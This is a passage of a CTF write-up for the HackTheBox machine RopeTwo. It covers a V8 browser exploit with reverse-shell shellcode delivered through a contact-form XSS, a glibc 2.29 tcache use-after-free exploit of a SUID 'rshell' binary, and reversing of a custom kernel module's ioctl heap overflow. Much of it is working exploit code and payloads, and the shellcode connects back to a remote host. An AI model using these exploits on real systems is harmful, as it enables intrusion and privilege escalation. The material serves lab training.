    return ftoi(fake[0], 64);
}

function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n & 0xffffffffn);

console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

console.log("[*] RWX INSTANCE:   0x" + rwx.toString(16));

var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [72, 49, 192, 72, 131, 192, 41, 72, 49, 255, 72, 137, 250, 72, 131, 199, 2, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 137, 199, 72, 49, 192, 80, 72, 131, 192, 2, 199, 68, 36, 252, 10, 10, 14, 14, 102, 199, 68, 36, 250, 17, 92, 102, 137, 68, 36, 248, 72, 131, 236, 8, 72, 131, 192, 40, 72, 137, 230, 72, 49, 210, 72, 131, 194, 16, 15, 5, 72, 49, 192, 72, 137, 198, 72, 131, 192, 33, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 1, 15, 5, 72, 49, 192, 72, 131, 192, 33, 72, 49, 246, 72, 131, 198, 2, 15, 5, 72, 49, 192, 80, 72, 187, 47, 98, 105, 110, 47, 47, 115, 104, 83, 72, 137, 231, 80, 72, 137, 226, 87, 72, 137, 230, 72, 131, 192, 59, 15, 5];

for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

console.log("[+] Spawning a shell...");
pwn();
```
Now, the obstacle was, where exactly are we supposed to submit the exploit to, there are no chrome instance running on any port, is there? But then, there was this `/contact` on the port 8000, at this point, I wasn't sure much either, so knowing the comment kind of template might have the XSS vulnerability, this was the only way that seemed to make sense, so giving the exploit as `<script>exploit</script>` in the message body and having our netcat listener waiting for the connection, we get the shell as `chromeuser`
![](/img/ropetwo/foothold.png)


# User 

After getting the foothold on the machine as `chromeuser`, looking over in the `/home` folder there were two directories which include `r4j` and `chromeuser` and since the `/home/chromeuser` didn't had `user.txt` or anything else that would hint towards something, I started doing the basic enumeration for finding the SUID binaries, which showed the following binaries:-

![](/img/ropetwo/ssh.png)

```asm
chromeuser@rope2:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/rshell
/usr/bin/mount
/usr/bin/at
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo

```

Out of all the listed binaries, the `rshell` stood out the most, running the binary was functioning as follows:-

```asm
chromeuser@rope2:~$ /usr/bin/rshell
$ ls
$ add 1
size: 100
content: sss
$ ls
1
$ whoami
r4j
$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)
$ ^C
chromeuse
```
Knowing the author, I assumed this `rshell` binary is going to be about binary exploitation, this meant it was time to transfer it to the machine of mine and start to dissect it to know the flow of it.

## Tcache Heap Exploitation

***

##### `main` function


```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-D4h]
  char s[200]; // [rsp+10h] [rbp-D0h]
  unsigned __int64 v5; // [rsp+D8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  initialize();
  memset(s, 0, 0xC8uLL);
  while ( 1 )
  {
    do
    {
      printf("$ ");
      v3 = read(0, s, 0xC7uLL);
    }
    while ( v3 <= 1 );
    s[v3 - 1] = 0;
    rshell(s);
  }
}
```


The `main` functions runs in a `while` loop, then it takes input via `read` showing the prompt `$`, there's a call to the `initialize` function which was as follows:-

```C
unsigned __int64 initialize()
{
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setreuid(0x3E8u, 0x3E8u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0; i <= 1; ++i )
  {
    memset(&directory_file_pointer[26 * i + 1], 0, 0xC8uLL);
    directory_file_pointer[26 * i] = 0LL;
  }
  return __readfsqword(0x28u) ^ v2;
}
```

It just setus the buffereing and do `memset` on the global array named `directory_file_pointers`, the `rshell` function was defined as follows. The `rshell` function seems to have 4 options including `id`, `ls`, `add`, `rm` and `edit` which proposed the basic functionality of the shell:-

```C
unsigned __int64 __fastcall rshell(char *a1)
{
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !strcmp(a1, "ls") )
  {
    print_directory();
  }
  else if ( !strncmp(a1, "add ", 4uLL) )
  {
    add(a1 + 4);
  }
  else if ( !strncmp(a1, "rm ", 3uLL) )
  {
    remove(a1 + 3);
  }
  else if ( !strncmp(a1, "echo ", 5uLL) )
  {
    puts(a1 + 5);
  }
  else if ( !strncmp(a1, "edit ", 5uLL) )
  {
    edit(a1 + 5);
  }
  else if ( !strcmp(a1, "whoami") )
  {
    puts("r4j");
  }
  else if ( !strcmp(a1, "id") )
  {
    puts("uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)");
  }
  else
  {
    printf("rshell: %s: command not found\n", a1);
  }
  return __readfsqword(0x28u) ^ v2;
}
```
> Allocated chunks here are referred to files in context of the binary

Seeing this, when we do `ls`, it calls `print_directory` which showed the list of allocated files, then for `add`, `edit` and `rm` it calls their respective functions and the last one being the `id` which just prints the string `uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)`, so this was doing nothing,

***

##### `add` function

This function was responsible for handling the workflow of adding new files:-


```C
unsigned __int64 __fastcall add(const char *a1)
{
  size_t size; // [rsp+1Ch] [rbp-14h]
  int i; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( directory_file_pointer[0] && qword_4130 )
  {
    puts("Memory Error!");
  }
  else
  {
    for ( HIDWORD(size) = 0; SHIDWORD(size) <= 1; ++HIDWORD(size) )
    {
      if ( !strcmp(&directory_file_pointer[26 * SHIDWORD(size) + 1], a1) )
      {
        puts("rshell: file exists");
        return __readfsqword(0x28u) ^ v4;
      }
    }
    for ( i = 0; i <= 1; ++i )
    {
      if ( !directory_file_pointer[26 * i] )
      {
        strncpy(&directory_file_pointer[26 * i + 1], a1, 0xBEuLL);
        LODWORD(size) = 0;
        printf("size: ");
        __isoc99_scanf("%u", &size);
        getchar();
        if ( size <= 0x70 )
        {
          directory_file_pointer[26 * i] = malloc(size);
          if ( !directory_file_pointer[26 * i] )
            exit(1);
          printf("content: ");
          fgets(directory_file_pointer[26 * i], size, stdin);
        }
        else
        {
          puts("Memory Error!");
          memset(&directory_file_pointer[26 * i + 1], 0, 0xC8uLL);
        }
        return __readfsqword(0x28u) ^ v4;
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

I'd advise you to go through the code yourself, but the functionality of this function can be summed up as following:-

* First off, it checks if there's no allocated chunks already if it does, whether it exceeds the memory limit, if so, print `"Memmory Error"`.
* Second, it iterates over the allocated chunks and comapare if the chunk name we are allocating is already available or not.
* Then it asks for the size and checks if it is less than `0x78` or not, **the size constraint hinted towards the tcache**.
* Then it allocates a chunk on heap with the size defined and attempt to take the input via `fgets` on that chunk.

The takeaways from this function are as follows:-

* The number of chunks(files) we can add is 2 at most.
* The size accepted for the chunk allocation is restricted to the 0x78, for which we can safely assume we will deal with tcache.


##### `rm` function

The `rm` function which was responsible for removing chunks(files) from the binary was handled by this function:-

```C
unsigned __int64 __fastcall remove(const char *a1)
{
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i <= 1; ++i )
  {
    if ( !strcmp(a1, &directory_file_pointer[26 * i + 1]) && directory_file_pointer[26 * i] )
    {
      memset(&directory_file_pointer[26 * i + 1], 0, 0xC8uLL);
      free(directory_file_pointer[26 * i]);
      directory_file_pointer[26 * i] = 0LL;
      return __readfsqword(0x28u) ^ v3;
    }
  }
  printf("rm: cannot remove '%s': No such file or directory\n", a1);
  return __readfsqword(0x28u) ^ v3;
}
```

This function was responsible for deleting files(chunks) from the global array, the function can be summed up as:-

* It checks whether te specified files is in the gloabl array `directory_file_pointer`.
* Then it does the `memset(chunk, 0x0, 0xc8)` which means whatever content was stored at that chunk would be `0x0` once we do `rm`.
* After that, it `free` that chunk and set the global pointer to NULL, totally making this function from being a victim of Use After Free.

Takeaways from this functions are:-

* Once `free`'d, the chunks would not contain any data.
* After being `free`'d, it NULLs out the global pointer which held the pointer for the heap chunks.
* No **Use After Free** from this function.


##### `edit` function

We also have a function called `edit`, this one was of a great interest:-

```C
unsigned __int64 __fastcall edit(const char *a1)
{
  size_t size; // [rsp+18h] [rbp-18h]
  void *v3; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( HIDWORD(size) = 0; ; ++HIDWORD(size) )
  {
    if ( SHIDWORD(size) > 1 )
    {
      puts("rshell: No such file or directory");
      return __readfsqword(0x28u) ^ v4;
    }
    if ( !strcmp(a1, &directory_file_pointer[26 * SHIDWORD(size) + 1]) && directory_file_pointer[26 * SHIDWORD(size)] )
      break;
  }
  LODWORD(size) = 0;
  printf("size: ");
  __isoc99_scanf("%u", &size);
  getchar();
  if ( size <= 0x70 )
  {
    v3 = realloc(directory_file_pointer[26 * SHIDWORD(size)], size);
    if ( v3 )
    {
      directory_file_pointer[26 * SHIDWORD(size)] = v3;
      printf("content: ");
      read(0, directory_file_pointer[26 * SHIDWORD(size)], size);
    }
    else
    {
      puts("Error");
    }
  }
  else
  {
    puts("Memory Error!");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

Did you saw the catch here? If not, don't worry, I couldn't either at first time, but let's break down the functionality of this function such that the logic of it becomes clear:-

* First off, this function checks whether the file(chunk), we requested for the edit is in the global arrat `directory_file_pointer` or not, if it does, proceed.
* Then it asks for the `size`, for which it'll be used to read new content.
* The size constraint here also hinted towards the `tcache` involvement.
* Then it does `realloc` with the size given and second argument being the chunk.
* Attempt to read into that extended chunk with the new data we wanted to store.

***

##### Vulnerability

The cue for this binary was the `edit`, pretty expected coming from heap challenge, for most part the vulnerability always seem to have in `edit` functionality provided by the binary. In this case, the vulerability arises from the use of the function `realloc`, for this if we refer to man pages, we can see how this was the point of the vulnerability:-

>  The  realloc() function changes the size of the memory block pointed to
>  by ptr to size bytes.  The contents will be unchanged in the range from
>  the start of the region up to the minimum of the old and new sizes.  If
>  the new size is larger than the old size, the added memory will not  be
>  initialized.   If  ptr  is  NULL,  then  the call is equivalent to mal‐
>  loc(size), for all values of size; if size is equal to zero, and ptr is
>  not  NULL,  then  the  call  is equivalent to free(ptr).  Unless ptr is
>  NULL, it must have been returned by an earlier call to  malloc(),  cal‐
>  loc(),  or realloc().  If the area pointed to was moved, a free(ptr) is
>  done.

Did you notice? Yes, calling `ralloc(0, &chunk)` is basically calling `free(&chunk)`, this is the cue, we have a **Use After Free** vulnerability in the `edit `function. Since there's no check for the size being `0`, as it only checks whether the given size is the within `0x70` this made the use of `realloc` function vulnerable here, making this the way to exploit the binary.

***


For this challenge, it would have been lot more easier if we had the GLIBC 2.27 instead of the GLIBC 2.29, since GLIBC 2.27 instroduced the `tcache` mechanism to a greater range of users and systems, it had quit a lot amount of flaw in the use of `tcache` which made them suspectible to vulnerabilites like double free, but as the vulnerabilities got reported, this resulted in some major change sin the LIBC 2.29, with the following security mechanism but not only limited to those:-

* Added checks for the double free which made it harder to propogate this vulnerability.
* Increase in assertion check of the size.
* Unsorted bin attack is not easy applicable.

Although, we don't have to deal with the **Unsorted bin** attack, and with the added checks for the double free, it makes the challenge much more difficult, making for us to bang our heads more than we already been doing.

We have to deal with the checks for the double free, which we will see later on.

The functions responsible for placing and retrieving the chunks out of the `tcache` are as follows:-

```C
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}


static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

As you can see, from [this](https://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md) there are no checks for double free, on the other hand, since the target system has the GLIBC 2.29 and above code snippet has a check for double since there's a use of `e->key` for the chunk, this made the challenge harder than usual.

***

First off, with the complication of the binary, we will try to do this with the ASLR off, to get the basic understanding of the exploit, then using it as base, we will proceed with it. In order to get over the workflow of heap management, I'd advise you to go through following links:-

* <https://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md>
* <https://jjy-security.tistory.com/10&prev=search&pto=aue>

Now, considering you have basic understanding of the tcache management, with that on our skill set, let's move on to write the wrapper functions to interact with the binary's functionalities:-

```py

def allocate(name, size, content):
	p.sendlineafter("$ ", "add {}".format(name))
	p.sendlineafter(": ", str(size))
	if len(content) == size:
		p.sendafter(": ", content)
	else:
		p.sendlineafter(": ", content)


def free(name):
	p.sendlineafter("$ ", "rm {}".format(name))

def realloc(name, size, content=None):
	p.sendlineafter("$ ", "edit {}".format(name))
	p.sendlineafter(": ", str(size))
	if content:
		p.sendafter(": ", content)
```

Now, with this aside, we will now move on the actual exploitation part, I'd say pay attention here as much as possible as the initial ideologyof the exploit is very confusing, but as you move on, you'll understand.

For starting, we will allocate and free chunk 1:-

```py
allocate(0, 0x48, "A")
free(0)
```

Now, this will land into the tcache bin:-

![](/img/ropetwo/chunk1.png)

Since, we know that calling `realloc(0, chunk)` will be just `free(chunk)`, we will allocate a chunk of size `0x68` and then do `realloc(0, chunk_2)` where `chunk_2` represent the chunk we allocated of size `0x68`.

```py
allocate(0, 0x68, "A")
realloc(0, 0, "")
```
Doing so, 

![](/img/ropetwo/realloc_free.png)

As you can see, it is not removed from the global array which is used to store the information about the allocated chunk and size, located at `base + 0x4060`. Now, moving on, we re-allocate the same chunk at the index `0` but we shrink the size from the `0x68` which was `free`'d earlier, and now we update the size to `0x18`, then we free it a

```py
realloc(0, 0x18, "A")
free(0)
```

Now, doing so, we have the same heap chunk at the tcache index 0 as well as on index 5.

![](/img/ropetwo/dup_entry.png)

Now, the same chunk reside in different indices, the reason that happened because first off, we allocated chunk of size `0x68`, then we `free`'d it with the `realloc(0, 0, "")` this `free'd` the region but the global pointer was not NULL, so when we do `realloc(0, 0x18, "A")`, this made the chunk which was `free`'d before, making the `free`'d chunk being used and it ended up being reduced to the size `0x18`, so when we `free` it again, the chunk will land into the different index of the `tcache` bin.

Now, we allocate another chunk of size `0x48`, then we `free` it again using the `realloc`:-


```py
allocate(0, 0x48, "B")
realloc(0, 0, "")
```

Doing so, the heap structure turned out to be:-

![](/img/ropetwo/chunk2.png)

Then, we `realloc` the same chunk as of the same size it was allocated to:-


```py
realloc(0, 0x48, "B"*0x10)
free(0)
```
Now:-

```asm
gef➤  heap bins
────────────────────────────────── Tcachebins for arena 0x7ffff7fbbc40 ──────────────────────────────────
Tcachebins[idx=0, size=0x20] count=1  ←  Chunk(addr=0x5555555592b0, size=0x20, flags=PREV_INUSE) 
Tcachebins[idx=3, size=0x50] count=3  ←  Chunk(addr=0x5555555592d0, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x5555555592d0, size=0x50, flags=PREV_INUSE)  →  [loop detected]
Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x5555555592b0, size=0x20, flags=PREV_INUSE) 

Now, the global pointer is also cleared

gsssef➤  x/10xg 0x0000555555554000 + 0x4060
0x555555558060:	0x0000000000000000	0x0000000000000000
0x555555558070:	0x0000000000000000	0x0000000000000000

```
Playing close attention here, the bin at the index 3, has now an entry pointing to itself, as shown by the `gef`. This aside, now we will allocate at chunk of size `0z48` which will be retrieved from the index 3, giving the address `0x5555555592d0`, since the chunk would still be in the same bin because of the duplicate entry. Now, we will re-allocate a chunk of size `0x68` at the index `1`, this will retrieve from the index 5 of the `tcache` bin list, since the same chunk `0x5555555592b0` is in two different indices, we write the payload `"C"*0x18 + p64(0x451)`, As the difference between the chunk at index 3 and index 5 of tcache is `0x20`, we will overwrite the `prev_size` to `0x451`, this made the heap structure like this:-

```py
allocate(0, 0x48, "C")
allocate(1, 0x68, b"C"*0x18+p64(0x451))
```

![](/img/ropetwo/size.png)

Once we free the chunk, the chunk at the index 1, it'll be:-

```py
free(1)
```

![](/img/ropetwo/free.png)


Now, we need to at least fill a certain index of the `tcache` bins in such a way that the chunk we `free` after filling the `tcache` lands into the fastbin. Now, the way we fill the `tcache` here is by allocating the chunk at the index 1, and then reallocating the same chunk by extending the size to a much bigger value and then `free`'ing the chunk.
```py
for i in range(9):
  allocate(1, 0x58, "D")
  realloc(1, 0x70, "D")
  free(1)
```
Doing so, the `tcache` bin structure becomes:-


![](/img/ropetwo/loop.png)


Then, we allocate a chunk of size `0x58` which will retrieve the chunk from the `tcache bin[3]`. Now, what we do here is free the chunk saved at the index 1, then the chunk which was allocated at the index `0` of the global array, we `free` it with the `realloc`, now doing so, since the chunk at that index had the size `0x451` which is more than the `tcache` structure can hold, this will make them land into the unsorted bin.

```py
allocate(1, 0x58, "A")
free(1)
realloc(0, 0, "")
```
Now, doing so, the chunk `0x5555555592d0` went into the unsorted bin, this chunk remain in the `tcache` and the `unsorted` bin:-

![](/img/ropetwo/unsorted.png)


Now, since the chunk belongs to `unsorted` bin, we can edit the `fd` and `bk` of it because of the **Use After Free&**, now then, as there's no show function, we populate the `fd` of that `free`'d chunk in the `_IO_2_1_stdout_` and the next time, we allocate the chunk, we will get the structure of the `_IO_2_1_stdout_` which we will be able to modify.

```py
realloc(0, 0x38, p16(0xc760)) # ASLR disabled
```
![](/img/ropetwo/stdout.png)

Now, we have to allocate chunk carefully since at this point the structure of the heap is not very good, doing anything reckless will mess up the exploit further. Now, what we do is again, allocate a chunk at the index 1, then reallocate the same chunk by shrinking it's size to smaller than it was allocate to, and `free`'ing it, now, when we try to reallocate the chunk 0, to a more smaller size and then `free` it, doing so, will make the `_IO_2_1_stdout_` address to the top of the index 3rd of the `tcache` bin list:-


```py
allocate(1, 0x48, "E")
realloc(1, 0x18, "E")
free(1)
realloc(0, 0x18, "E"*0x10)
free(0)
```
![](/img/ropetwo/head.png)

Now, apparently explaining the structure of the `_IO_2_1_stdout_` is too much hassle in this already long writeup, so I'll add the references link below for understanding the structure. Now, what we do here is allocate a chuk at the index 0 with the size `0x48`, which will return the chunk stored from the `bin[3]`, the given data will be written to the address pointed by the chunk, whhich would look likt his:-


```py
allocate(0, 0x48, p64(0xfbad1800)+p64(0)*3)
```
![](/img/ropetwo/io.png)


After a `puts` call, there was lot of addresses dumped to the `stdout`, which was bit too much, this made it hard to get an exact lLIBC leak, this problem was with the ASLR off, which, in turn ran with the bruteforce works perfectly normal.
So, for the ASLR off part, the leak parsing was something like this:-


```py
        leak = p.recv(0xe20 + 0x10)[0xe20 + 0x5:0xe20 + 0x5 + 6]
        leak = u64(leak.ljust(8, b"\x00")) #+ 0x197a000
        leak = int(hex(leak), 16)

        log.info("LEAK:   0x%x" %(leak))
        libc.address = leak + 0x197f000 #0x1b2634
        log.info("LIBC:   0x%x" %(libc.address))
        log.info("LIBC:   0x%x" %(libc.address))

        log.info("__free_hook:   0x%x" %(libc.sym['__free_hook']))

p.sendline("") # Fix the buffer of thr program
```
Now, what we do is, allocate at the chunk 1 with size `0x70` and then `free` it with the use of the `realloc`, this will push the chunk on the `tcache` bin list, now we again reallocate the same chunk by shrinking it's size to the `0x18`, then we allocate the chunk of the same size earlier and edit the `fd` of the next adjacent chunk to the `__free_hook - 0x8` and made the size to the `0x41` which will make it belong to bin of size `0x50`. Then we `free` the chunk 1.
```py
allocate(1, 0x70, "F")
realloc(1, 0, "")

realloc(1, 0x18, "F"*0x10)
free(1)

allocate(1, 0x70, b"F"*0x18+p64(0x41)+p64(libc.sym["__free_hook"] - 0x8))
free(1)
```

![](/img/ropetwo/free_hook.png)

Now, we retrieve the chunk and overwrite the `free_hook` with the system:

```py
allocate(1, 0x58, "G")
realloc(1, 0x28, "G")
free(1)

allocate(1, 0x58, b"/bin/sh\x00" + p64(libc.sym['system']))
```
![](/img/ropetwo/system.png)


Now, we invoke the `__free_hook` by calling the `rm` function:-


```py
p.sendlineafter("$ ", "rm 1")
p.interactive()
```

![](/img/ropetwo/shell.png)

The final script for the remote server can be found [here](https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/User)

Running the remote exploit, since ASLR was enabled on the server, we have to bruteforce the last 4 bytes of the `_IO_2_1_stdout_`, in my case I had the issue with the LIBC leak, with the help of the [FizzBuzz](https://willsroot.io), using the last bytes as `p16(0x2760)`, doing that so and running the exploit in `while` loop, I got the shell with 40-60 tries:-

> Issue, after getting the shell as the user `r4j`, I couldn't read the `user.txt` which was because of the groups I belonged, using the `newgrp` and leveraging to the `r4j` group, I was able to read the user flag.

![](/img/ropetwo/user.png)

# Root


Now, being the user `r4j` didn't really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the `/dev/` to look for any suspicious driver, in this case the only thing that stood out more than the other was, `ralloc`. 

> Attachment: The files for root exploitation can be found [here](https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Root).

One way I found about the `ralloc` custom LKM was with the help of `dmesg`, which showed the follwing message:-

![](/img/ropetwo/dmesg.png)

Now, that showed, we have the `ralloc`, although to start off with the exploitation or even knowing the workflow of this module, I needed to get the `ralloc.ko`, doing `locate ralloc.ko`, the file was located at `/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko` which is the default path where kernel modules are stored. Then checking for the kernel version:-

```C
Linux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
##### Kernel Exploitation


There was no publically available CVE for this version of kernel, what left was to dissect the binary and try to understand the workflow and look for any vulnerable part. I am more fan of IDA than of Ghidra, but then again it's just personal preference, at the end you'll have the overall idea. So, moving on, let's reverse engineer the binary and see what the binary really does:-

Now, using the `IDA` and cleaning up the code a lot, there were 3 functions, in which the `rope2_ioctl` was one of the functions which was most interesting, the other 2 being `rope2_init` and `rope2_exit` are there to handle the intialization and exit operation for the modules, aside from those, the function we need to really focus on was the `rope2_ioctl` which was as follows:-

> The development of the exploit is done on the QEMU instance which can be foind at the above attached link.
> KASLR has been off for the debugging purpose but it is enabled on the RopeTwo machine.
First off, there were four options one could invoke, which were as follows:-

```C
    case 0x1000:
      heap.size = *&request.size;
      if ( *&request.size <= 0x400uLL && request.index <= 0x1F )
      {
        heap.chunk = (&arr + 16 * request.index);
        if ( !heap.chunk[1] )
        {
          chunk = _kmalloc(*&request.size, 0x6000C0LL);
          heap.chunk[1] = chunk;
          if ( chunk )
          {
            *heap.chunk = heap.size + 32;
            return_value = 0LL;
            goto exit;
          }
        }
      }
      goto jump_to_exit;
```

The first option, here which can be invoked by giving the `0x1000` as option, which we will see later on how we will interact with it, here it takes the two options, `index` and the other being `size` on the basis of that, it will allocate the chunk on the kernel heap with the `kmalloc` and save it on the global array with the index given, the upmost `index` that we could allocate to is `0x1F` and accepted size is `<= 0x400`.
```C
    case 0x1001:
      if ( request.index <= 0x1F )
      {
        index = 2LL * request.index;
        array_1 = &arr + index * 8;
        if ( heap_list[index] )
        {
          kfree();
          *(array_1 + 1) = 0LL;
          return_value = 0LL;
          goto exit;
        }
      }
      goto jump_to_exit;
```

The option `0x1001` here is used to invoke a function which only takes `index` as the option and then checks if the index exist or not, on the basis of that it calls `kfree` and release the allocated chunk.

```C
    case 0x1002:
      heap2.chunk = request.buf;
      if ( request.index <= 0x1F )
      {
        heap1.index = 2LL * request.index;
        heap1.chunk = heap_list[heap1.index];
        heap1.size = (&arr + heap1.index * 8);
        if ( heap1.chunk )
        {
          memcpy_size = request.size;
          if ( request.size <= *heap1.size && !(request.buf & 0xFFFF000000000000LL) )
            goto memcpy_jump;
        }
      }
jump_to_exit:
      return_value = -1LL;
      goto exit;
  }
```
The option was used to write to an allocated region, it takes the `index`, the `size` and the pointer to the buffered region.

```C
  if ( choice != 0x1003 )
    goto jump_to_exit;
  heap1.chunk = request.buf;
  if ( request.index > 0x1F )
    goto jump_to_exit;
  heap2.index = 2LL * request.index;
  heap2.chunk = heap_list[heap2.index];
  heap2.size = (&arr + heap2.index * 8);
  if ( !heap2.chunk )
    goto jump_to_exit;
  memcpy_size = request.size;
  if ( *heap2.size < request.size || request.buf & 0xFFFF000000000000LL )
    goto jump_to_exit;
memcpy_jump:
  memcpy(heap1.chunk, heap2.chunk, memcpy_size);
  return_value = 0LL;
exit:
  mutex_unlock(&lock);
  return return_value;
}
```

This function was used to interact in order to read from the allocated region, this takes the `index`, `size` and the pointer to the buffer where the contents from the allocated region will be copied, this pointer would from the userland region.

Summarsing the code, we conclude it to:-

* `0x1000`: Allocate function which takes `index` and `size`.
* `0x1001`: Free function which takes the `index`.
* `0x1002`: Write function which takes the `index` `size` and `data` to be written.
* `0x1003`: Read function which takes `index`, `size` and the `data` where the contents of the chunk would be read.
* We can only allocate chunks upto to `0x1F` times.

So, where does the vulnerabilit exists? It exists in the function `0x1000` which is used for allocation, now let's see where it was:-

```C
         chunk = _kmalloc(*&request.size, 0x6000C0LL);
          heap.chunk[1] = chunk;
          if ( chunk )
          {
            *heap.chunk = heap.size + 32;
            return_value = 0LL;
            goto exit;
```
The structure of the `heap` can be considered as:

```C
struct heap {
  int size;
  char *buf;
}  // This is not accurate, it's here just for the explaination
```
If you pay close attention to the `heap.size + 32`, well considering how the `heap` structure here is, there's an extra 32 bytes added to it. This in turn, allowed us to write 32 bytes more than size of an allocated chunk, same as for read, we can read extra 32 bytes than the chunk's actual size.
So, conlcuding, we have **32** byte extra overflow for read/write. Now, the question arises, how exactly we interact with the service, to do so, I used `ioctl` to interact with it, the following functions I created:-

```C
struct message {
  unsigned int index;
  long size;
  char *buf;
};


void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
   if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

```

> The `*.cpio` file could be compiled with `find . | cpio -H newc -ov -F ../initramfs.cpio`

For the experimentation, I made a QEMU instance of the Linux Kernel `5.0.-38` with the `ralloc.ko` as a module loaded to it upon starting, which I uploaded to the github, linked above, try it yourself. 

The question we end up at last at exactly how are we supposed to exploit this heap overflow which only gives us the extra 32 bytes to do read/write. Upon the extensive research, I found [this blog post](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#tty_struct) by [ptr-yudai](https://twitter.com/ptr-yudai), which if translated to the english stated as follows:-

***

**Size** : 0x2e0 (kmalloc-1024)
**base** : `ops` the `ptm_unix98_ops` leak possible because it refers to. Besides that, it pointed to the data area of ​​the kernel in about two places.
**Heap** : `dev`, driver` leak possible because like many of the object is pointing to the members of the heap and own. The target SLUB has not been investigated.
**stack** : I can't seem to leak.
**Secure** : `/dev/ptmx` Open.
**Release** : Close the open `ptmx`.
**Remarks** : `ops` RIP can be controlled by rewriting.
